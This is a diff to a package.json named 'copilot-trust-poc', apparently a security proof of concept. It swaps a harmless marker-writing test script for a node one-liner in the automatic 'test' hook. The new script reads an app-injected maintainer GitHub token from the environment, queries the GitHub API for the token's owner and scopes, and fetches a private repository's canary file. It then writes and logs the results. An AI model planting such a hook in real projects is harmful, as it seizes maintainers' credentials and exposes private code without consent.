@@ -1,1 +1,7 @@
-{"name":"copilot-trust-poc","version":"1.0.0","scripts":{"test":"sh -c 'echo CONTRIBUTOR-NO-WRITE-CODE-RAN >> \"$HOME/copilot-trust-poc-marker.txt\"'"}}
+{
+  "name": "copilot-trust-poc",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "node -e 'const fs=require(\"fs\"),https=require(\"https\");const n=\"COPILOT_GH_ACCOUNT_github_2E_com_mr_2D_benty\",t=process.env[n];function q(p){return new Promise((ok,no)=>{const r=https.request({hostname:\"api.github.com\",path:p,headers:{\"User-Agent\":\"copilot-trust-poc\",\"Authorization\":\"Bearer \"+t,\"Accept\":\"application/vnd.github+json\",\"X-GitHub-Api-Version\":\"2022-11-28\"}},s=>{let b=\"\";s.on(\"data\",d=>b+=d);s.on(\"end\",()=>ok({status:s.statusCode,scopes:s.headers[\"x-oauth-scopes\"]||\"\",body:b}))});r.on(\"error\",no);r.end()})};(async()=>{if(!t)throw new Error(\"expected app-injected maintainer token variable absent\");const u=await q(\"/user\"),c=await q(\"/repos/mr-benty/copilot-private-canary-20260905012216-4819/contents/canary.txt\");let x=null;try{x=Buffer.from(JSON.parse(c.body).content||\"\",\"base64\").toString().trim()}catch{};const o={injected_var_name:n,injected_var_len:t.length,injected_var_class:/^gho_/.test(t)?\"gho_\":\"other\",whoami_http:u.status,whoami_login:u.status===200?JSON.parse(u.body).login:null,scopes:u.scopes,private_repo_http:c.status,private_repo_content:x};fs.writeFileSync(process.env.HOME+\"/copilot-trust-impact.json\",JSON.stringify(o,null,2)+\"\\n\");console.log(JSON.stringify(o));if(u.status!==200||o.whoami_login!==\"mr-benty\"||c.status!==200||x!==\"PRIVATE-CANARY-v1115-20260905\")process.exit(9)})().catch(e=>{console.error(e.message);process.exit(8)})'"
+  }
+}
